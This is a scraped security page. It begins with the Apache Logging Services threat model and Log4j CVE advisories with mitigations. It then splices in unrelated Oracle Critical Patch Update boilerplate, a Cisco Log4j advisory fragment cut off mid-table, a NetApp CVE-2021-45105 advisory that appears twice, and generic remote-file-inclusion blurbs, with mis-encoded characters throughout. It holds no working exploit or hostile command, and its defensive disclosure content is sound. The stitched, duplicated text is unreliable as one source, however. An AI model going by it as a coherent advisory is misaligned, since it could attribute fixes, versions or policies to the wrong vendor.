The Logging Services Security Team takes security seriously.
This allows our users to place their trust in Log4j for protecting their mission-critical data.
In this page we will help you find guidance on security-related issues and access to known vulnerabilities.

| Warning | [Log4j 1](/log4j/1.x) has [reached End of Life](https://blogs.apache.org/foundation/entry/apache_logging_services_project_announces) in 2015, and is no longer supported. Vulnerabilities reported after August 2015 against Log4j 1 are not checked and will not be fixed. Users should [upgrade to Log4j 2](/log4j/2.x/manual/migration.html) to obtain security fixes. |
| --- | --- |

## Getting support

If you need help on building or configuring Logging Services projects or other help on following the instructions to mitigate the known vulnerabilities listed here, please use our [user support channels](support.html#discussions).

| Tip | If you need to apply a source code patch, use the building instructions for the project version that you are using. These instructions can be found in `BUILDING.adoc`, `BUILDING.md`, etc. files distributed with the sources. |
| --- | --- |

## Reporting vulnerabilities

If you have encountered an unlisted security vulnerability or other unexpected behaviour that has a security impact, or if the descriptions here are incomplete, please report them **privately** to the Logging Services Security Team.

| Important | We urge you to **carefully read the threat model** detailed in following sections before submitting a report. It guides users on certain safety instructions while using Logging Services software and elaborates on what counts as an unexpected behaviour that has a security impact. |
| --- | --- |

### Common threat model

Below we share the threat model shared by all Logging Services projects.

#### Code signing

All Logging Services software release distributions are signed using GPG using a key from the Logging Services PMC [KEYS file](https://downloads.apache.org/logging/KEYS).
Information on how to verify releases signatures are explained further in [the Download page](download.html).
Thus, GPG signatures should be validated in your build process.

#### Configuration sources

All configuration sources to an application must be trusted by the programmer.
When loading a configuration file from disk (especially when a monitor interval is configured to reload the file periodically), the location of the configuration file must be kept safe from unauthorized modifications.
Similarly, when loading a configuration file over the network such as through HTTP, this should be configured to use TLS or a secure connection in general with strong authentication guarantees.
This remote location must be kept safe from unauthorized modifications.

For Java-based projects supporting JNDI or JMX,
when configurations are modified through JMX, the JMX server should be safely configured to require authentication and a secure connection if being accessed over the network.
When configurations are provided through JNDI, these should only use the `java` scheme for sharing configurations in a Java EE or Jakarta EE application service.
JNDI-sourced configurations should not use other JNDI providers such as LDAP, DNS, or RMI, as all these providers are difficult to properly secure.

#### Java Object Serialization Stream Protocol

[Java Object Serialization Stream Protocol](https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html) should not be used to deserialize data from untrusted sources.
See [the related OWASP guide](https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data) for details.

### Log4j threat model

Below we share the threat model specific to [Log4j](/log4j).

#### Parameterized logging

When using a log message containing template parameters like `{}`, only the format string is evaluated for parameters to be substituted.
The message parameters themselves are not evaluated for parameters; they are only included in the format string corresponding to their template position.
The conversion of message parameters into a string is done on-demand depending on the layout being used.
When structure-preserving transformations of log message data are required, the `Message` API should be used for logging structured data combined with a structured layout (e.g., `JsonTemplateLayout`).
Format strings should be compile-time constants, and under no circumstances should format strings be built using user-controlled input data.

#### Unstructured logging

When using an unstructured layout such as `PatternLayout`, no guarantees can be made about the output format.
This layout is mainly useful for development purposes and should not be relied on in production applications.
For example, if a log message contains new lines, these are not escaped or encoded specially unless the configured pattern uses the `%encode{pattern}{CRLF}` wrapper pattern converter (which will encode a carriage return as the string `\r` and a line feed as the string `\n`) or some other `%encode` option.
Note that `%xEx` is appended to the pattern unless already present.
Similarly, other encoding options are available for other formats, but pattern layouts cannot make assumptions about the entire output.
As such, when using unstructured layouts, no user-controlled input should be included in logs.
It is strongly recommended that a structured layout (e.g., `JsonTemplateLayout`) is used instead for these situations.
Note that `StrLookup` plugins (those referenced by `${…​}` templates in configuration files) that contain user-provided input should not be referenced by layouts.

#### Structured logging

When using a structured layout (most layouts besides pattern layout), log messages are encoded according to various output formats.
These safely encode the various fields included in a log message.
For example, the `JsonTemplateLayout` can be configured to output log messages in various JSON structures where all log data is properly encoded into safely parseable JSON.
This is the recommended mode of operation for use with log parsing and log collection tools that rely on log files or arbitrary output streams.

#### Java Security Manager

Log4j 3 no longer supports running in or using a custom `SecurityManager`.
This Java feature has been deprecated for removal in Java 21.
Log4j 2 includes partial support for running with a Security Manager.

#### Log masking

Log4j, like any other generic logging library, cannot generically support log masking of sensitive data.
While custom plugins may be developed to attempt to mask various regular expressions (such as a string that looks like a credit card number), the general problem of log masking is equivalent to the halting problem in computer science where sensitive data can always be obfuscated in such a way as to avoid detection by log masking.
As such, it is the responsibility of the developer to properly demarcate sensitive data such that it can be consistently masked by log masking plugins.
This sort of use case should make use of the `Message` API for better control over the output of such data.

#### Availability

Log4j goes to great lengths to minimize performance overhead along with options for minimizing latency or maximizing throughput.
However, we cannot guarantee availability of the application if the appenders cannot keep up with the logs being written.
Synchronous logging can cause applications to block and wait for a log message to be written.
Asynchronous logging can also cause applications to block and wait depending on the wait strategy and queue full policy configured.
Configuring too large or too many buffers in an application can also result in out of memory errors.

#### Compressing logs

If log compression is used along with custom encryption where logs contain user-controlled input, then this can lead to a [CRIME attack](https://en.wikipedia.org/wiki/CRIME) style vulnerability where a chosen-plaintext attack is combined with information leakage caused by how the compression algorithm handles different inputs.
The simplest way to avoid this problem is to never combine compression with encryption when encoding user-controlled input.

### Log4Net threat model

Below we share the threat model specific to [log4net](/log4net).

#### Parameterized logging

When using a log message containing template parameters like `{0}`, only the format string is evaluated for parameters to be substituted.
The message parameters themselves are not evaluated for parameters; they are only included in the format string corresponding to their template position.
The conversion of message parameters into a string is done on-demand depending on the layout being used.
When structure-preserving transformations of log data are required, a structured layout (e.g., `XmlLayout`) should be used.
Format strings should be compile-time constants, and under no circumstances should format strings be built using user-controlled input data.

#### Unstructured logging

When using an unstructured layout such as `PatternLayout`, no guarantees can be made about the output format.
This layout is mainly useful for development purposes and should not be relied on in production applications.
For example, if a log message contains new lines, these are not escaped or encoded.
As such, when using unstructured layouts, no user-controlled input should be included in logs.
It is strongly recommended that a structured layout (e.g., `XmlLayout`) is used instead for these situations.

#### Structured logging

When using a structured layout (most layouts besides pattern layout), log messages are encoded according to various output formats.
These safely encode the various fields included in a log message.
For example, the `XmlLayout` can be used to output log messages in an XML structure where all log data is properly encoded into safely parseable XML.
This is the recommended mode of operation for use with log parsing and log collection tools that rely on log files or arbitrary output streams.

#### Log masking

Log4Net, like any other generic logging library, cannot generically support log masking of sensitive data.
While custom plugins may be developed to attempt to mask various regular expressions (such as a string that looks like a credit card number), the general problem of log masking is equivalent to the halting problem in computer science where sensitive data can always be obfuscated in such a way as to avoid detection by log masking.
As such, it is the responsibility of the developer to properly demarcate sensitive data such that it can be consistently masked by log masking plugins.

#### Availability

Log4Net goes to great lengths to minimize performance overhead along with options for minimizing latency or maximizing throughput.
However, we cannot guarantee availability of the application if the appenders cannot keep up with the logs being written.
Logging can cause applications to block and wait for a log message to be written.

## Vulnerability handling policy

The Logging Services Security Team follows the [ASF Project Security](https://www.apache.org/security/committers.html) guide for handling security vulnerabilities.

Reported security vulnerabilities are subject to voting (by means of [*lazy approval*](https://logging.apache.org/guidelines.html), preferably) in the private security mailing list before creating a CVE and populating its associated content.
This procedure involves only the creation of CVEs and blocks neither (vulnerability) fixes, nor releases.

## Vulnerability Disclosure Report (VDR)

Many Logging Services projects distribute [CycloneDX Software Bill of Materials (SBOM)](https://cyclonedx.org/capabilities/vdr) along with each deployed artifact.
This is streamlined by [Logging Parent](/logging-parent) for Maven-based projects.

Produced SBOMs contain BOM-links referring to a [CycloneDX Vulnerability Disclosure Report (VDR)](https://cyclonedx.org/capabilities/vdr) that Apache Logging Services uses for all projects it maintains.
This VDR is accessible through the following URL: <https://logging.apache.org/cyclonedx/vdr.xml>

## Known vulnerabilities

The Logging Services Security Team believes that accuracy, completeness and availability of security information is essential for our users.
We choose to pool all information on this one page, allowing easy searching for security vulnerabilities over a range of criteria.

| Note | We adhere to [the Maven version range syntax](https://maven.apache.org/enforcer/enforcer-rules/versionRanges.html) while sharing versions of affected components. We only extend this mathematical notation with set union operator (i.e., `âª`) to denote union of multiple ranges. |

### [CVE-2021-44832](https://nvd.nist.gov/vuln/detail/CVE-2021-44832)

| Summary | JDBC appender is vulnerable to remote code execution in certain configurations |
| --- | --- |
| CVSS 3.x Score & Vector | 6.6 MEDIUM (CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H) |
| Components affected | `log4j-core` |
| Versions affected | `[2.0-beta7, 2.3.2) âª [2.4, 2.12.4) âª [2.13.0, 2.17.1)` |
| Versions fixed | `2.3.2` (for Java 6), `2.12.4` (for Java 7), or `2.17.1` (for Java 8 and later) |

#### Description

An attacker with write access to the logging configuration can construct a malicious configuration using a JDBC Appender with a data source referencing a JNDI URI which can execute remote code.
This issue is fixed by limiting JNDI data source names to the `java` protocol.

#### Mitigation

Upgrade to `2.3.2` (for Java 6), `2.12.4` (for Java 7), or `2.17.1` (for Java 8 and later).

In prior releases confirm that if the JDBC Appender is being used it is not configured to use any protocol other than `java`.

### [CVE-2021-45105](https://nvd.nist.gov/vuln/detail/CVE-2021-45105)

| Summary | Infinite recursion in lookup evaluation |
| --- | --- |
| CVSS 3.x Score & Vector | 5.9 MEDIUM (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H) |
| Components affected | `log4j-core` |
| Versions affected | `[2.0-alpha1, 2.3.1) âª [2.4, 2.12.3) âª [2.13.0, 2.17.0)` |
| Versions fixed | `2.3.1` (for Java 6), `2.12.3` (for Java 7), and `2.17.0` (for Java 8 and later) |

#### Description

Log4j versions `2.0-alpha1` through `2.16.0` (excluding `2.3.1` and `2.12.3`), did not protect from uncontrolled recursion that can be implemented using self-referential lookups.
When the logging configuration uses a non-default Pattern Layout with a Context Lookup (for example, `$${ctx:loginId}`), attackers with control over Thread Context Map (MDC) input data can craft malicious input data that contains a recursive lookup, resulting in a `StackOverflowError` that will terminate the process.
This is also known as a *DoS (Denial-of-Service)* attack.

#### Mitigation

Upgrade to `2.3.1` (for Java 6), `2.12.3` (for Java 7), or `2.17.0` (for Java 8 and later).

Alternatively, this infinite recursion issue can be mitigated in configuration:

* In PatternLayout in the logging configuration, replace Context Lookups like `${ctx:loginId}` or `$${ctx:loginId}` with Thread Context Map patterns (`%X`, `%mdc`, or `%MDC`).
* Otherwise, in the configuration, remove references to Context Lookups like `${ctx:loginId}` or `$${ctx:loginId}` where they originate
  from sources external to the application such as HTTP headers or user input.
  Note that this mitigation is insufficient in releases older than `2.12.2` (for Java 7), and `2.16.0` (for Java 8 and later) as the issues fixed in those releases will still be present.

Note that only the `log4j-core` JAR file is impacted by this vulnerability.
Applications using only the `log4j-api` JAR file without the `log4j-core` JAR file are not impacted by this vulnerability.

### [CVE-2021-45046](https://nvd.nist.gov/vuln/detail/CVE-2021-45046)

| Summary | Thread Context Lookup is vulnerable to remote code execution in certain configurations |
| --- | --- |
| CVSS 3.x Score & Vector | 9.0 CRITICAL (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H) |
| Components affected | `log4j-core` |
| Versions affected | `[2.0-beta9, 2.3.1) âª [2.4, 2.12.3) âª [2.13.0, 2.17.0)` |
| Versions fixed | `2.3.1` (for Java 6), `2.12.3` (for Java 7), and `2.17.0` (for Java 8 and later) |

#### Description

It was found that the fix to address [CVE-2021-44228](#CVE-2021-44228) in Log4j `2.15.0` was incomplete in certain non-default configurations.
When the logging configuration uses a non-default Pattern Layout with a Thread Context Lookup (for example, `$${ctx:loginId}`), attackers with control over Thread Context Map (MDC) can craft malicious input data using a JNDI Lookup pattern, resulting in an information leak and remote code execution in some environments and local code execution in all environments.
Remote code execution has been demonstrated on macOS, Fedora, Arch Linux, and Alpine Linux.

Note that this vulnerability is not limited to just the JNDI lookup.
Any other Lookup could also be included in a Thread Context Map variable and possibly have private details exposed to anyone with access to the logs.

Note that only the `log4j-core` JAR file is impacted by this vulnerability.
Applications using only the `log4j-api` JAR file without the `log4j-core` JAR file are not impacted by this vulnerability.

#### Mitigation

Upgrade to Log4j `2.3.1` (for Java 6), `2.12.3` (for Java 7), or `2.17.0` (for Java 8 and later).

#### Credits

This issue was discovered by Kai Mindermann of iC Consult and separately by 4ra1n.

Additional vulnerability details discovered independently by Ash Fox of Google, Alvaro MuÃ±oz and Tony Torralba from GitHub, Anthony Weems of Praetorian, and RyotaK (@ryotkak).

### [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

| Summary | JNDI lookup can be exploited to execute arbitrary code loaded from an LDAP server |
| --- | --- |
| CVSS 3.x Score & Vector | 10.0 CRITICAL (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H) |
| Components affected | `log4j-core` |
| Versions affected | `[2.0-beta9, 2.3.1) âª [2.4, 2.12.3) âª [2.13.0, 2.17.0)` |
| Versions fixed | `2.3.1` (for Java 6), `2.12.3` (for Java 7), and `2.17.0` (for Java 8 and later) |

#### Description

In Log4j, the JNDI features used in configurations, log messages, and parameters do not protect against attacker-controlled LDAP and other JNDI related endpoints.
An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers.

Note that only the `log4j-core` JAR file is impacted by this vulnerability.
Applications using only the `log4j-api` JAR file without the `log4j-core` JAR file are not impacted by this vulnerability.

#### Mitigation

##### Log4j 1 mitigation

| Warning | [Log4j 1](/log4j/1.x) has [reached End of Life](https://blogs.apache.org/foundation/entry/apache_logging_services_project_announces) in 2015, and is no longer supported. Vulnerabilities reported after August 2015 against Log4j 1 are not checked and will not be fixed. Users should [upgrade to Log4j 2](/log4j/2.x/manual/migration.html) to obtain security fixes. |
| --- | --- |

Log4j 1 does not have Lookups, so the risk is lower.
Applications using Log4j 1 are only vulnerable to this attack when they use JNDI in their configuration.
A separate CVE ([CVE-2021-4104](https://nvd.nist.gov/vuln/detail/CVE-2021-4104)) has been filed for this vulnerability.
To mitigate, audit your logging configuration to ensure it has no `JMSAppender` configured.
Log4j 1 configurations without `JMSAppender` are not impacted by this vulnerability.

##### Log4j 2 mitigation

Upgrade to Log4j `2.3.1` (for Java 6), `2.12.3` (for Java 7), or `2.17.0` (for Java 8 and later).

### [CVE-2020-9488](https://nvd.nist.gov/vuln/detail/CVE-2020-9488)

| Summary | Improper validation of certificate with host mismatch in SMTP appender |
| --- | --- |
| CVSS 3.x Score & Vector | 3.7 LOW (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N) |
| Components affected | `log4j-core` |
| Versions affected | `[2.0-beta1, 2.12.3) âª [2.13.1, 2.13.2)` |
| Versions fixed | `2.12.3` (Java 7) and `2.13.2` (Java 8 and later) |

#### Description

Improper validation of certificate with host mismatch in SMTP appender.
This could allow an SMTPS connection to be intercepted by a man-in-the-middle attack which could leak any log
messages sent through that appender.

The reported issue was caused by an error in `SslConfiguration`.
Any element using `SslConfiguration` in the Log4j `Configuration` is also affected by this issue.
This includes `HttpAppender`, `SocketAppender`, and `SyslogAppender`.
Usages of `SslConfiguration` that are configured via system properties are not affected.

#### Mitigation

Upgrade to `2.12.3` (Java 7) or `2.13.2` (Java 8 and later).

Alternatively, users can set the `mail.smtp.ssl.checkserveridentity` system property to `true` to enable SMTPS hostname verification for all SMTPS mail sessions.

### [CVE-2017-5645](https://nvd.nist.gov/vuln/detail/CVE-2017-5645)

| Summary | TCP/UDP socket servers can be exploited to execute arbitrary code |
| --- | --- |
| CVSS 2.0 Score & Vector | 7.5 HIGH (AV:N/AC:L/Au:N/C:P/I:P/A:P) |
| Components affected | `log4j-core` |
| Versions affected | `[2.0-alpha1, 2.8.2)` |
| Versions fixed | `2.8.2` (Java 7) |

#### Description

When using the TCP socket server or UDP socket server to receive serialized log events from another application, a specially crafted binary payload can be sent that, when deserialized, can execute arbitrary code.

#### Mitigation

Java 7 and above users should migrate to version `2.8.2` or avoid using the socket server classes.
Java 6 users should avoid using the TCP or UDP socket server classes, or they can manually backport [the security fix commit](https://github.com/apache/logging-log4j2/commit/5dcc192) from `2.8.2`.

## Oracle Critical Patch Update Advisory - July 2022

### Description

A Critical Patch Update is a collection of patches for multiple security vulnerabilities.  These patches address vulnerabilities in Oracle code and in third-party components included in Oracle products.  These patches are usually cumulative, but each advisory describes only the security patches added since the previous Critical Patch Update Advisory. Thus, prior Critical Patch Update advisories should be reviewed for information regarding earlier published security patches.  Refer to [“Critical Patch Updates, Security Alerts and Bulletins”](https://www.oracle.com/security-alerts/) for information about Oracle Security advisories.

**Oracle continues to periodically receive reports of attempts to maliciously exploit vulnerabilities for which Oracle has already released security patches. In some instances, it has been reported that attackers have been successful because targeted customers had failed to apply available Oracle patches. Oracle therefore strongly recommends that customers remain on actively-supported versions and apply Critical Patch Update security patches without delay.**

This Critical Patch Update contains 349 new security patches across the product families listed below. Please note that an MOS note summarizing the content of this Critical Patch Update and other Oracle Software Security Assurance activities is located at  [July 2022 Critical Patch Update: Executive Summary and Analysis](https://support.oracle.com/rs?type=doc&id=2880220.1).

**Please note that since the release of the April 2022 Critical Patch Update, Oracle has released a Security Alert for Oracle E-Business Suite [CVE-2022-21500 (May 19, 2022)](https://www.oracle.com/security-alerts/alert-cve-2022-21500.html). Customers are strongly advised to apply the July 2022 Critical Patch Update for Oracle E-Business Suite, which includes patches for this Alert as well as additional patches.**

#### Note:

* Vulnerabilities affecting Oracle Solaris may affect Oracle ZFSSA so Oracle customers should refer to the Oracle and Sun Systems Product Suite Critical Patch Update Knowledge Document, [My Oracle Support Note 2160904.1](https://support.oracle.com/rs?type=doc&id=2160904.1) for information on minimum revisions of security patches required to resolve ZFSSA issues published in Critical Patch Updates and Solaris Third Party bulletins.
* Solaris Third Party Bulletins are used to announce security patches for third party software distributed with Oracle Solaris. Solaris 10 customers should refer to the latest patch-sets which contain critical security patches detailed in Systems Patch Availability Document. Please see Reference Index of CVE IDs and Solaris Patches ([My Oracle Support Note 1448883.1](https://support.oracle.com/rs?type=doc&id=1448883.1)) for more information.
* Users running Java SE with a browser can download the latest release from <https://java.com>. Users on the Windows and Mac OS X platforms can also use [automatic updates](https://www.java.com/en/download/help/java_update.xml) to get the latest release.

### Risk Matrix Content

Risk matrices list only security vulnerabilities that are newly addressed by the patches associated with this advisory. Risk matrices for previous security patches can be found in [previous Critical Patch Update advisories and Alerts](https://www.oracle.com/security-alerts). An English text version of the risk matrices provided in this document is  [here](/security-alerts/cpujul2022verbose.html).

Several vulnerabilities addressed in this Critical Patch Update affect multiple products. Each vulnerability is identified by a [CVE#](https://cve.mitre.org/) which is its unique identifier. A vulnerability that affects multiple products will appear with the same CVE# in all risk matrices. A CVE# shown in *italics* indicates that this vulnerability impacts a different product, but also has impact on the product where the italicized CVE# is listed.

Security vulnerabilities are scored using CVSS version 3.1 (see [Oracle CVSS Scoring](/security-alerts/cvssscoringsystem.html) for an explanation of how Oracle applies CVSS version 3.1).

Oracle conducts an analysis of each security vulnerability addressed by a Critical Patch Update. Oracle does not disclose detailed information about this security analysis to customers, but the resulting Risk Matrix and associated documentation provide information about the type of vulnerability, the conditions required to exploit it, and the potential impact of a successful exploit. Oracle provides this information, in part, so that customers may conduct their own risk analysis based on the particulars of their product usage. For more information, see [Oracle vulnerability disclosure policies](https://www.oracle.com/us/support/assurance/disclosure-policies/index.html).

Oracle lists updates that address vulnerabilities in third-party components that are not exploitable in the context of their inclusion in their respective Oracle product beneath the product's risk matrix.

The protocol in the risk matrix implies that all of its secure variants (if applicable) are affected as well. For example, if HTTP is listed as an affected protocol, it implies that HTTPS (if applicable) is also affected. The secure variant of a protocol is listed in the risk matrix only if it is the *only* variant affected, e.g. HTTPS will typically be listed for vulnerabilities in SSL and TLS.

### Workarounds

**Due to the threat posed by a successful attack, Oracle strongly recommends that customers apply Critical Patch Update security patches as soon as possible**. Until you apply the Critical Patch Update patches, it may be possible to reduce the risk of successful attack by blocking network protocols required by an attack. For attacks that require certain privileges or access to certain packages, removing the privileges or the ability to access the packages from users that do not need the privileges may help reduce the risk of successful attack. Both approaches may break application functionality, so Oracle strongly recommends that customers test changes on non-production systems. Neither approach should be considered a long-term solution as neither corrects the underlying problem.

### Skipped Critical Patch Updates

Oracle strongly recommends that customers apply security patches as soon as possible. For customers that have skipped one or more Critical Patch Updates and are concerned about products that do not have security patches announced in this Critical Patch Update, please review [previous Critical Patch Update advisories](https://www.oracle.com/security-alerts) to determine appropriate actions.

### Critical Patch Update Supported Products and Versions

Patches released through the Critical Patch Update program are provided only for product versions that are covered under the Premier Support or Extended Support phases of the  [Lifetime Support Policy](https://www.oracle.com/us/support/lifetime-support/index.html?ssSourceSiteId=otnen). Oracle recommends that customers plan product upgrades to ensure that patches released through the Critical Patch Update program are available for the versions they are currently running.

Product releases that are not under Premier Support or Extended Support are not tested for the presence of vulnerabilities addressed by this Critical Patch Update. However, it is likely that earlier versions of affected releases are also affected by these vulnerabilities. As a result, Oracle recommends that customers upgrade to supported versions.

Database, Fusion Middleware, and Oracle Enterprise Manager products are patched in accordance with the Software Error Correction Support Policy explained in [My Oracle Support Note 209768.1](https://support.oracle.com/rs?type=doc&id=209768.1). Please review the [Technical Support Policies](https://www.oracle.com/us/support/policies/index.html?ssSourceSiteId=otnen) for further guidelines regarding support policies and phases of support.

To help detect exploitation of these vulnerabilities, Cisco has released Snort rules at the following location: [Talos Rules 2021-12-21](https://www.snort.org/advisories/talos-rules-2021-12-21)  Product fixes that are listed in this advisory will address both CVE-2021-44228 and CVE-2021-45046 unless otherwise noted.  Cisco has reviewed CVE-2021-45105 and CVE-2021-44832 and has determined that no Cisco products or cloud offerings are impacted by these vulnerabilities.  Cisco's standard practice is to update integrated third-party software components to later versions as they become available.  This advisory is available at the following link:<https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-apache-log4j-qRuKNEbd>  Affected Products  * Cisco investigated its product line to determine which products may be affected by these vulnerabilities.  This advisory only lists Cisco products and services that are known to include the impacted software component and thus may be vulnerable. Products and services that do not contain the impacted software component are not vulnerable and therefore are not listed in this advisory. Any Cisco product or service that is not explicitly listed in the Affected Products section of this advisory is not affected by the vulnerability or vulnerabilities described.  The [Vulnerable Products](#vp) section includes Cisco bug IDs for each affected product. The bugs are accessible through the Cisco Bug Search Tool and contain additional platform-specific information, including workarounds (if available) and fixed software releases.    Vulnerable Products Cisco investigated its product line to determine which products may be affected by these vulnerabilities.  The following table lists Cisco products that are affected by one or both of the vulnerabilities that are described in this advisory. Customers should refer to the associated Cisco bug(s) for further details.       | Product | Cisco Bug ID | [Fixed Release Availability](https://sec.cloudapps.cisco.com/security/center/resources/security_vulnerability_policy.html#fixes) |   | --- | --- | --- |   | Collaboration and Social Media | | |   | Cisco Webex Meetings Server | [CSCwa47283](https://bst.cloudapps.cisco.com/bugsearch/bug/CSCwa47283) | CWMS-3.0MR4SP3 patch (21 Dec 2021)CWMS-4.0MR4SP3 patch (21 Dec 2021)CWMS-3.0MR4SP2 patch (14 Dec 2021)CWMS-4.0MR4SP2 patch (14 Dec 2021) |   | Endpoint Clients and Client Software | | |   | Cisco CX Cloud Agent Software | [CSCwa47272](https://bst.cloudapps.cisco.com/bugsearch/bug/CSCwa47272) | 1.12.2 (17 Dec 2021) |   | Network Application, Service, and Acceleration | | |   | Cisco Call Studio | [CSCwa54008](https://bst.cloudapps.cisco.com/bugsearch/bug/CSCwa54008) | 11.6(2) (23 Dec 2021)12.0(1) (23 Dec 2021)12.5(1) (23 Dec 2021)12.6(1) (23 Dec 2021) |   | Cisco Nexus Insights | [CSCwa47284](https://bst.cloudapps.cisco.com/bugsearch/bug/CSCwa47284) | 6.0.2 (17 Dec 2021) |   | Network and Content Security Devices | | |   | Cisco Firepower Threat Defense (FTD) managed by Firepower Device Manager (FDM) | [CSCwa46963](https://bst.cloudapps.cisco.com/bugsearch/bug/CSCwa46963) | 6.2.3 hotfix (Available) 6.4.0 hotfix (Available) 6.6.5 hotfix (Available) 6.7.0 hotfix (Available)7.0.1 hotfix (Available)7.1.0 hotfix (Available) |   | Cisco Identity Services Engine (ISE) | [CSCwa47133](https://bst.cloudapps.cisco.com/bugsearch/bug/CSCwa47133) | 2.4 hotfix (15 Dec 2021)2.6 hotfix (15 Dec 2021)2.7 hotfix (15 Dec 2021)3.0 hotfix (15 Dec 2021)3.1 hotfix (17 Dec 2021) |   | Network Management and Provisioning | | |   | Cisco Application Policy Infrastructure Controller (APIC) -

**Advisory ID:** NTAP-20211218-0001
**Version:**
17.0

**Last updated:**
06/21/2022

**Status:**
Final.

**CVEs:** CVE-2021-45105

Overview
#### Summary

Multiple NetApp products incorporate Apache Log4j. Apache Log4j versions 2.0-alpha1 through 2.16.0 did not protect from uncontrolled recursion from self-referential lookups. Versions prior to 2.17.0 are susceptible to a vulnerability when the logging configuration uses a non-default Pattern Layout with a Context Lookup. When successfully exploited this could allow attackers with control over Thread Context Map (MDC) input data to craft malicious input data that contains a recursive lookup, resulting in a StackOverflowError that will terminate the process.

#### Impact

Successful exploitation of this vulnerability could lead to Denial of Service (DoS).

NetApp SolidFire, Enterprise SDS & HCI Storage Node (Element Software) is affected only when the âVirtual Volumes (vVols)â feature is enabled on the cluster.

#### Vulnerability Scoring Details

| **CVE** | **Score** | **Vector** |
| --- | --- | --- |
| [CVE-2021-45105](https://nvd.nist.gov/vuln/detail/CVE-2021-45105) | 5.9 (MEDIUM) | CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H |

Remediation
#### Software Versions and Fixes

NetApp's currently available patches are listed below.

| **Product** | **First Fixed in Release** |
| --- | --- |
| **Cloud Secure Agent** | <https://kb.netapp.com/Advice_and_Troubleshooting/Cloud_Services/Cloud_Insights/How_to_verify_the_Apache_Log4j_version_for_Cloud_Secure_Agent_within_Cloud_Insights> The fix was automatically deployed on 20211221 under the same version of Cloud Secure Agent. |
| **ONTAP tools for VMware vSphere** | <https://mysupport.netapp.com/site/products/all/details/otv/downloads-tab/download/63792/9.8P2/> <https://mysupport.netapp.com/site/products/all/details/otv/downloads-tab/download/63792/9.10/> Apache Log4j has been upgraded to version 2.17 in ONTAP Tools for VMware vSphere. |
| **Cloud Manager** | This issue is fixed and auto-remediated. Cloud Manager instances with the Auto-upgrade setting enabled should have updated on 20220102 to the fixed version 3.9.14 build4. No further action is required.  Cloud Manager instances with the Auto-upgrade setting disabled should follow the steps below to enable it to receive the fixed version. 1. Connect to the Cloud Manager command line using SSH. 2. Run "sudo -s". 3. Navigate to the app.conf location - note that the file could be in varying locations per Cloud Manager version. Use âfind . -name app.confâ to locate it. 4. Create a backup of the app.conf file. 5. Edit the app.conf file and change the "auto-upgrade" flag from "false" to "true". 6. Save the file and then restart the Cloud Manager instance. 7. Once the instance is back up visit the Cloud Manager UI to confirm that the version is now 3.9.14 or higher. |

[CVE-2021-45105](#CVE-2021-45105)
### Rule Vulnerability

Remote File Inclusion

Remote File Inclusion (RFI) attacks occur when a webserver takes a file crafted by an attacker as input and runs or stores it in an unsafe manner. For instance, the webserver could accept an image file that is actually code, then call it to execute after uploading. RFI attacks happen on web applications that dynamically include external files or scripts. A successful RFI can lead to data leaks, remote code execution, or cross site scripting. Avoid dynamic inclusion of user input files, or whitelist files that may be included. Keep the PHP allow\_url\_include option set to off; this will not protect against Local File Inclusion attacks.

**Advisory ID:** NTAP-20211218-0001
**Version:**
17.0

**Last updated:**
06/21/2022

**Status:**
Final.

**CVEs:** CVE-2021-45105

Overview
#### Summary

Multiple NetApp products incorporate Apache Log4j. Apache Log4j versions 2.0-alpha1 through 2.16.0 did not protect from uncontrolled recursion from self-referential lookups. Versions prior to 2.17.0 are susceptible to a vulnerability when the logging configuration uses a non-default Pattern Layout with a Context Lookup. When successfully exploited this could allow attackers with control over Thread Context Map (MDC) input data to craft malicious input data that contains a recursive lookup, resulting in a StackOverflowError that will terminate the process.

#### Impact

Successful exploitation of this vulnerability could lead to Denial of Service (DoS).

NetApp SolidFire, Enterprise SDS & HCI Storage Node (Element Software) is affected only when the âVirtual Volumes (vVols)â feature is enabled on the cluster.

#### Vulnerability Scoring Details

| **CVE** | **Score** | **Vector** |
| --- | --- | --- |
| [CVE-2021-45105](https://nvd.nist.gov/vuln/detail/CVE-2021-45105) | 5.9 (MEDIUM) | CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H |

| **Cloud Manager** | This issue is fixed and auto-remediated. Cloud Manager instances with the Auto-upgrade setting enabled should have updated on 20220102 to the fixed version 3.9.14 build4. No further action is required.  Cloud Manager instances with the Auto-upgrade setting disabled should follow the steps below to enable it to receive the fixed version. 1. Connect to the Cloud Manager command line using SSH. 2. Run "sudo -s". 3. Navigate to the app.conf location - note that the file could be in varying locations per Cloud Manager version. Use âfind . -name app.confâ to locate it. 4. Create a backup of the app.conf file. 5. Edit the app.conf file and change the "auto-upgrade" flag from "false" to "true". 6. Save the file and then restart the Cloud Manager instance. 7. Once the instance is back up visit the Cloud Manager UI to confirm that the version is now 3.9.14 or higher. |

[CVE-2021-45046](#CVE-2021-45046)
[CVE-2021-45105](#CVE-2021-45105)
### Rule Vulnerability

Remote File Inclusion

Remote File Inclusion (RFI) attacks occur when a webserver takes a file crafted by an attacker as input and runs or stores it in an unsafe manner. For instance, the webserver could accept an image file that is actually code, then call it to execute after uploading. RFI attacks happen on web applications that dynamically include external files or scripts. A successful RFI can lead to data leaks, remote code execution, or cross site scripting. Avoid dynamic inclusion of user input files, or whitelist files that may be included. Keep the PHP allow\_url\_include option set to off; this will not protect against Local File Inclusion attacks.

## Oracle Critical Patch Update Advisory - April 2022

### Description

A Critical Patch Update is a collection of patches for multiple security vulnerabilities.  These patches address vulnerabilities in Oracle code and in third-party components included in Oracle products.  These patches are usually cumulative, but each advisory describes only the security patches added since the previous Critical Patch Update Advisory. Thus, prior Critical Patch Update advisories should be reviewed for information regarding earlier published security patches.  Refer to [“Critical Patch Updates, Security Alerts and Bulletins”](https://www.oracle.com/security-alerts/) for information about Oracle Security advisories.

